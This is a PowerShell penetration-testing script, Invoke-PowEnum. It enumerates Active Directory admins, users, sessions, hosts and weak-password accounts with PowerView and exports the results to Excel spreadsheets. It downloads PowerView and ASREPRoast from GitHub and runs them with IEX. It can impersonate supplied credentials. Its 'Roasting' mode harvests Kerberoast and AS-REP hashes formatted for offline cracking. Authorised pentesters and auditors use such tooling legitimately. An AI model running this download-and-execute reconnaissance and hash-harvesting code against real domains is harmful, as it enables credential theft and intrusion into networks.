#requires -version 2

function Invoke-PowEnum
{
<# 
	.SYNOPSIS 
		Enumerates and exports AD data using PowerView into a .xlsx.
		Author: Andrew Allen
		License: BSD 3-Clause
		
	.DESCRIPTION 
		Enumerates domain info using PowerSploit's PowerView
		then combines the exported .csv's into a tabbed spreadsheet.
		
	.NOTES 
		Requires Excel to be installed on your system. 
		Requires PowerView for most of the functionality.
		I've been on a lot of internal pentests	and found that I'm often enumerating environments with compromised creds using common PowerView commands then putting them into spreadsheets to analyze using filters and VLookup. Instead of doing this manually, this script will automate that process. 

	.LINK 
		PowerSploit PowerView: https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
		Export to CSV: https://gist.github.com/gregklee/b01348787af0b47d8b30
	
	.PARAMETER Domain

		Specifies the domain to use, defaults to the current domain.
		
	.PARAMETER Mode
	
		Basic: Basic Enumeration:
				UsersAndGroups Speadsheet
					Domain Admins, Enterprise Admins, Built-In Admins, DC Local Admins, All Domain Users, All Domain Groups
				HostsAndSessions Spreadsheet
					All [DC Aware] Net Sessions, Domain Controller, Domain Computer IPs, Domain Computers, Subnets, DNSRecords, WinRM Enabled Hosts
		Roasting: Kerberoast and ASREPRoast
		LargeEnv: Basic Enumeration without Get-DomainUser/Group/Computer
		Special: Enumerates Users With Specific Account Attributes:
			Disabled Account
			Enabled, Password Not Required
			Enabled, Password Doesn't Expire
			Enabled, Password Doesn't Expire & Not Required
			Enabled, Smartcard Required
			Enabled, Smartcard Required, Password Not Required
			Enabled, Smartcard Required, Password Doesn't Expire
		
	.EXAMPLE 
		
		PS C:\> Invoke-PowEnum
		
		Basic enumeration only using current domain and credential. Grabs PowerView from github.
	
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -URL http://10.0.0.10/PowerView.ps1
		
		Perform basic enumeration for a specific domain using PowerView at the set URL
		
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -Domain test.com
		
		Perform basic enumeration for a specific domain. 
		
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -Mode Special
		
		Perform enumeration of user accounts with specific attributes.
	
	.EXAMPLE	
		
		PS C:\> Invoke-PowEnum -Credential (Get-Credential) -Mode Special
		
		Perform enumeration of user accounts with specific attributes using an alternate credential.
#>

[CmdletBinding(DefaultParameterSetName="Domain")]
Param(
	[Parameter(Position = 0)]
	[String]
	$Domain,
	
	[Parameter(Position = 1)]
	[ValidateSet('DCOnly', 'Roasting', 'LargeEnv', 'Special')]
    [String]
    $Mode = 'DCOnly',

	[Parameter(Position = 2)]
    [String]
    $URL = "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1",
	
	[Parameter(ParameterSetName = 'Credential')]
    [Management.Automation.PSCredential]
    [Management.Automation.CredentialAttribute()]
    $Credential
)
	
	
Write-Host "To run from a non-domain joined system:" -ForegroundColor Cyan
Write-Host "runas /netonly /user:DOMAIN\USERNAME powershell.exe"

#Start Stopwatch
$stopwatch = [system.diagnostics.stopwatch]::startnew()

#Download PowerView from specified URL or from GitHub.
try {
    if (Test-Path .\PowerView.ps1){
	    Write-Host "Skipping Download: PowerView.ps1 present"
        Import-Module .\PowerView.ps1    
	}
	else {	
        $webclient = New-Object System.Net.WebClient
        $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        Write-Host "Downloading Powerview:" -ForegroundColor Cyan
        Write-Host "$URL | " -NoNewLine
        IEX $webclient.DownloadString($URL)
        Write-Host "Success" -ForegroundColor Green
    }
}catch {Write-Host "Error" -ForegroundColor Red; Return}
	
#Uses PowerView to create a new "runas /netonly" type logon and impersonate the token.
if ($Credential -ne $null){
	try{
		$NetworkCredential = $Credential.GetNetworkCredential()
        $Domain = $NetworkCredential.Domain
        $UserName = $NetworkCredential.UserName
	Write-Host "Impersonate user:$Domain\$Username | " -NoNewLine
	Invoke-UserImpersonation -Credential $Credential -WarningAction silentlyContinue | Out-Null
	Write-Host "Success" -ForegroundColor Green 
	}catch{Write-Host "Error" -ForegroundColor Red; Return}
	
}	
	
#Grab Local Domain: Use passed credential ojbject of using PowerView Function If None Provided
if (!$domain -and $credential -ne $null) {
$NetworkCredential = $Credential.GetNetworkCredential()
$Domain = $NetworkCredential.Domain
}
elseif (!$domain -and !$Credential) {$domain = (Get-Domain).Name}

if (!$domain) {Write-Host "Unable to retrieve domain, exiting..." -ForegroundColor Red; Return}
else {Write-Host "Enumeration Domain: $domain" -ForegroundColor Cyan}

#Supprese Errors and Warnings
$ErrorActionPreference = 'Continue'
$WarningPreference = "SilentlyContinue"

#Set up spreadsheet arrary and count
$script:ExportSheetCount = 1
$script:ExportSheetFileArray = @()


if ($Mode -eq 'DCOnly') {
	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
	$script:ExportSheetCount = 1
	$script:ExportSheetFileArray = @()
	PowEnum-DAs
	PowEnum-EAs
	PowEnum-BltAdmins
    PowEnum-DCLocalAdmins
	PowEnum-Users
	PowEnum-Groups
	PowEnum-ExcelFile -SpreadsheetName Basic-UsersAndGroups
	
	$script:ExportSheetCount = 1
	$script:ExportSheetFileArray = @()
	PowEnum-NetSess
	PowEnum-DCs
	PowEnum-IPs
	PowEnum-Computers
	PowEnum-Subnets
	PowEnum-DNSRecords
    PowEnum-WinRM
	PowEnum-ExcelFile -SpreadsheetName Basic-HostsAndSessions
}
elseif ($Mode -eq 'Roasting') {
	PowEnum-Kerberoast
    $webclient = New-Object System.Net.WebClient
    $webclient.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
    $URL = "https://raw.githubusercontent.com/HarmJ0y/ASREPRoast/master/ASREPRoast.ps1"
    Write-Host "Downloading ASREPRoast:" -ForegroundColor Cyan
    Write-Host "$URL"
    IEX $webclient.DownloadString($URL)
	PowEnum-ASREPRoast
	PowEnum-ExcelFile -SpreadsheetName Roasting
}
elseif ($Mode -eq 'LargeEnv') {
	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
	$script:ExportSheetCount = 1
	$script:ExportSheetFileArray = @()
	PowEnum-DAs
	PowEnum-EAs
	PowEnum-BltAdmins
    PowEnum-DCLocalAdmins
	PowEnum-ExcelFile -SpreadsheetName Large-Users
	
	$script:ExportSheetCount = 1
	$script:ExportSheetFileArray = @()
	PowEnum-NetSess
	PowEnum-DCs
	PowEnum-Subnets
	PowEnum-DNSRecords
    PowEnum-WinRM
	PowEnum-ExcelFile -SpreadsheetName Large-HostsAndSessions
}
elseif ($Mode -eq 'Special') {
	Write-Host "Enumeration Mode: $Mode" -ForegroundColor Cyan
	PowEnum-Disabled
	PowEnum-PwNotReq
	PowEnum-PwNotExp
	PowEnum-PwNotExpireNotReq
	PowEnum-SmartCardReq
	PowEnum-SmartCardReqPwNotReq
	PowEnum-SmartCardReqPwNotExp
	PowEnum-ExcelFile -SpreadsheetName Special
}
else {
	Write-Host "Incorrect Mode Selected"
	Return
}

$stopwatch.Stop()
Write-Host "Running Time: $($stopwatch.Elapsed.TotalSeconds) seconds"
Write-Host "Exiting..." -ForegroundColor Yellow
}

function PowEnum-DCs {
	try {
		Write-Host "[ ]Domain Controllers | " -NoNewLine
		$temp = Get-DomainController -Domain $domain | Select-Object Name, IPAddress, Domain, Forest, OSVersion, SiteName
		PowEnum-ExportAndCount -TypeEnum DCs
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-DAs {
	try {
		Write-Host "[ ]Domain Admins | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Domain Admins" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		PowEnum-ExportAndCount -TypeEnum DAs
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-EAs {
	try {
		Write-Host "[ ]Enterprise Admins | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Enterprise Admins" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		PowEnum-ExportAndCount -TypeEnum EAs
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-BltAdmins {
	try {
		Write-Host "[ ]Builtin Administrators | " -NoNewLine
		$temp = Get-DomainGroupMember -Identity "Administrators" -Recurse -Domain $domain | Select-Object MemberName, GroupName, MemberDomain, MemberObjectClass
		PowEnum-ExportAndCount -TypeEnum BltAdmins
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-Users {
	try {
		Write-Host "[ ]All Domain Users | " -NoNewLine
		$temp = Get-DomainUser -Domain $domain | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
		PowEnum-ExportAndCount -TypeEnum Users
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-Groups {
	try {
		Write-Host "[ ]All Domain Groups | " -NoNewLine
		$temp = Get-DomainGroup -Domain $domain | Select-Object samaccountname, admincount, description, iscriticalsystemobject
		PowEnum-ExportAndCount -TypeEnum Groups
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-Computers {
	try {
		Write-Host "[ ]All Domain Computers | " -NoNewLine
		$temp = Get-NetComputer -Domain $domain | Select-Object samaccountname, dnshostname, operatingsystem, operatingsystemversion, operatingsystemservicepack, lastlogon, badpwdcount, iscriticalsystemobject, distinguishedname
		PowEnum-ExportAndCount -TypeEnum Computers
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-IPs {
	try {
		Write-Host "[ ]All Domain Computer IP Addresses  | " -NoNewLine
		$temp = Get-DomainComputer -Domain $domain | Get-IPAddress
		PowEnum-ExportAndCount -TypeEnum IPs
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-DCLocalAdmins {
	try {
		Write-Host "[ ]All Domain Controller Local Admins | " -NoNewLine
		$temp = Get-DomainController -Domain $domain | Get-NetLocalGroupMember
		PowEnum-ExportAndCount -TypeEnum DCLocalAdmins
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-Subnets {
	try {
		Write-Host "[ ]Domain Subnets | " -NoNewLine
		$temp = Get-DomainSubnet -Domain $domain
		PowEnum-ExportAndCount -TypeEnum Subnets
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-DNSRecords {
	try {
		Write-Host "[ ]DNS Zones & Records | " -NoNewLine
		$temp = Get-DomainDNSZone -Domain $domain | Get-DomainDNSRecord
		PowEnum-ExportAndCount -TypeEnum DNSRecords
	}catch {Write-Host "Error" -ForegroundColor Red}
}

#This function is broken right now so is it not being utilized
function PowEnum-HVTs {
	try {
		Write-Host "[ ]High Value Targets | " -NoNewLine
		
        #Grab all admins of the DCs
        $LocalAdminsOnDCs = Get-DomainController -Domain $domain | Get-NetLocalGroupMember
        
        #Grab all "Domain" accounts and get the members
        $temp = $LocalAdminsOnDCs | Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $TRUE} | ForEach-Object {$_.MemberName.Substring($_.MemberName.IndexOf("\")+1)} | Sort-Object -Unique | Get-DomainGroupMember
        
        #Grab all non-Domain accounts and get the members
        $temp = $LocalAdminsOnDCs | Where-Object {$_.IsGroup -eq $TRUE -and $_.IsDomain -eq $FALSE} | ForEach-Object {$_.MemberName.Substring($_.MemberName.IndexOf("\")+1)} | Sort-Object -Unique | Get-NetLocalGroupMember
        
        PowEnum-ExportAndCount -TypeEnum HVTs
	
    }catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-NetSess {
	try {
		Write-Host "[ ]Net Sessions | " -NoNewLine
		$temp = Get-DomainController -Domain $domain | Get-NetSession | ?{$_.UserName -notlike "*$"}
		PowEnum-ExportAndCount -TypeEnum NetSess
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-WinRM {
	try {
		Write-Host "[ ]WinRm (Powershell Remoting) Enabled Hosts | " -NoNewLine
		$temp = Get-DomainComputer -Domain $domain -LDAPFilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -SPN "wsman*" -Properties dnshostname,operatingsystem,distinguishedname
		PowEnum-ExportAndCount -TypeEnum WinRM
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-Disabled {
	try{
		Write-Host "[ ]Disabled Account | " -NoNewLine
		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '514'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
		PowEnum-ExportAndCount -TypeEnum Disabled
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-PwNotReq {
	try{
		Write-Host "[ ]Enabled, Password Not Required | " -NoNewLine
		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '544'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname
		PowEnum-ExportAndCount -TypeEnum PwNotReq
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-PwNotExp {
	try{
		Write-Host "[ ]Enabled, Password Doesn't Expire | " -NoNewLine
		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '66048'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum PwNotExpire
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-PwNotExpireNotReq {
	try{
		Write-Host "[ ]Enabled, Password Doesn't Expire & Not Required | " -NoNewLine
		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '66080'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum PwNotExpireNotReq
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-SmartCardReq {
	try{
		Write-Host "[ ]Enabled, Smartcard Required | " -NoNewLine
		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '262656'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReq
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-SmartCardReqPwNotReq {
	try{
		Write-Host "[ ]Enabled, Smartcard Required, Password Not Required | " -NoNewLine
		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '262688'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotReq
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-SmartCardReqPwNotExp {
	try{
		Write-Host "[ ]Enabled, Smartcard Required, Password Doesn't Expire | " -NoNewLine
		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '328192'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotExp
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-SmartCardReqPwNotExpNotReq {
	try{
		Write-Host "[ ]Enabled, Smartcard Required, Password Doesn't Expire & Not Required | " -NoNewLine
		$temp = Get-DomainUser -Domain $domain | Where-Object {$_.useraccountcontrol -eq '328224'} | Select-Object samaccountname, description, pwdlastset, iscriticalsystemobject, admincount, memberof, distinguishedname 
		PowEnum-ExportAndCount -TypeEnum SmartCardReqPwNotExpNotReq
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-ASREPRoast {
	try{
		Write-Host "[ ]ASREProast (John Format) | " -NoNewLine
		$temp = Invoke-ASREPRoast -Domain $domain
		PowEnum-ExportAndCount -TypeEnum ASREPRoast
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-Kerberoast {
	try{
		Write-Host "[ ]Kerberoast (Hashcat Format) | " -NoNewLine
		$temp = Invoke-Kerberoast -OutputFormat Hashcat -Domain $domain -WarningAction silentlyContinue
		PowEnum-ExportAndCount -TypeEnum Kerberoast
	}catch {Write-Host "Error" -ForegroundColor Red}
}

function PowEnum-ExportAndCount {
	Param(
		[Parameter(Position = 0)]
		[String]
		$TypeEnum
	)
	if($temp -ne $null){
		
		#Grab the file name and the full path
		$exportfilename = $domain.Substring(0,$domain.IndexOf("."))+ '_' + $ExportSheetCount.toString() + '_' + $TypeEnum + '.csv'
		$exportfilepath = (Get-Item -Path ".\" -Verbose).FullName + '\' + $exportfilename
		
		#Perform the actual export
		$temp | Export-CSV -NoTypeInformation -Path ('.\' + $exportfilename)

		#Create new file object and add to array
		$ExportSheetFile = new-object psobject
		$ExportSheetFile | add-member NoteProperty Name $exportfilename
		$ExportSheetFile | add-member NoteProperty FullName $exportfilepath
		$script:ExportSheetFileArray += $ExportSheetFile
	}
	$count = $temp | measure-object | select-object -expandproperty Count
	Write-Host "$count Identified" -ForegroundColor Green
	$script:ExportSheetCount++
}

function PowEnum-ExcelFile {
	Param(
		[Parameter(Position = 0, Mandatory = $True)]
		[String]
		$SpreadsheetName
	)
	
	try {
		Write-Host "[ ]Combining csv file(s) to xlsx | " -NoNewLine
		
		#Exit if enumeration resulting in nothing
		if($script:ExportSheetFileArray.Count -eq 0){Write-Host "No Data Identified" -ForegroundColor Yellow; Return}
		$path = (Get-Item -Path ".\" -Verbose).FullName
		$XLOutput =  $path + "\" + $Domain + "_" + $SpreadsheetName.Substring($SpreadsheetName.IndexOf("_")+1) + "_" + $(get-random) + ".xlsx"

		# Create Excel object (visible), workbook and worksheet
		$Excel = New-Object -ComObject excel.application 
		$Excel.visible = $false
		$Excel.sheetsInNewWorkbook = $script:ExportSheetFileArray.Count
		$workbooks = $excel.Workbooks.Add()
		$CSVSheet = 1

		Foreach ($CSV in $script:ExportSheetFileArray) {

			$worksheets = $workbooks.worksheets
			$CSVFullPath = $CSV.FullName
			
			$SheetName = ($CSV.name -split "\.")[0]
			$worksheet = $worksheets.Item($CSVSheet)
			$worksheet.Name = $SheetName
			
			# Define the connection string and the starting cell for the data
			$TxtConnector = ("TEXT;" + $CSVFullPath)
			$CellRef = $worksheet.Range("A1")

			# Build, use and remove the text file connector
			$Connector = $worksheet.QueryTables.add($TxtConnector,$CellRef)
			$worksheet.QueryTables.item($Connector.name).TextFileCommaDelimiter = $True 
			$worksheet.QueryTables.item($Connector.name).TextFileParseType  = 1 
			$worksheet.QueryTables.item($Connector.name).Refresh() | Out-Null
			$worksheet.QueryTables.item($Connector.name).delete()

			# Autofit the columns, freeze the top row
			$worksheet.UsedRange.EntireColumn.ColumnWidth = 15
			$worksheet.Application.ActiveWindow.SplitRow = 1
			#$worksheet.Application.ActiveWindow.FreezePanes = $true

			# Set color & border to top header row
			$Selection = $worksheet.cells.Item(1,1).EntireRow
			$Selection.Interior.ColorIndex = 37
			$Selection.BorderAround(1) | Out-Null
			$Selection.Font.Bold=$True
			
			$CSVSheet++
		}

		# Save workbook and close Excel
		$workbooks.SaveAs($XLOutput,51)
		$workbooks.Saved = $true
		$workbooks.Close()
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($workbooks) | Out-Null
		$Excel.Quit()
		[System.Runtime.Interopservices.Marshal]::ReleaseComObject($Excel) | Out-Null
		$CSVSheet--
		Write-Host "$CSVSheet Sheeet(s) Processed" -ForegroundColor Green
		[System.GC]::Collect()
		[System.GC]::WaitForPendingFinalizers()
		
	}catch{Write-Host "Error" -ForegroundColor Red}
}
